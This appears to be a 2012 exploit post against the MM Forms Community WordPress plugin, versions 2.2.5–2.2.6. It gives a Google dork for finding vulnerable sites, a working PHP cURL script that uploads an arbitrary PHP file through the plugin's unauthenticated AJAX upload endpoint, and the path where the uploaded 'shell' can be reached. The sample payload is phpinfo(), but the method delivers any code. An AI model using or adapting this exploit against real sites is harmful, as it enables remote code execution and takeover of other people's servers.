##################################################
# Description : Wordpress Plugins - MM Forms Community Arbitrary File 
Upload Vulnerability
# Version : 2.2.5 - 2.2.6
# Link : http://wordpress.org/extend/plugins/mm-forms-community/
# Plugins : http://downloads.wordpress.org/plugin/mm-forms-community.zip
# Date : 24-05-2012
# Google Dork : inurl:/wp-content/plugins/mm-forms-community/
# Author : Sammy FORGIT - sam at opensyscom dot fr - 
http://www.opensyscom.fr
##################################################


Exploit :

PostShell.php
<?php

$uploadfile="lo.php";
$ch = 
curl_init("http://www.exemple.com/wordpress/wp-content/plugins/mm-forms-community/includes/doajaxfileupload.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
         array('fileToUpload'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

Shell Access : 
http://www.exemple.com/wordpress/wp-content/plugins/mm-forms-community/upload/temp/
Filename : $postResult output

lo.php
<?php
phpinfo();
?>
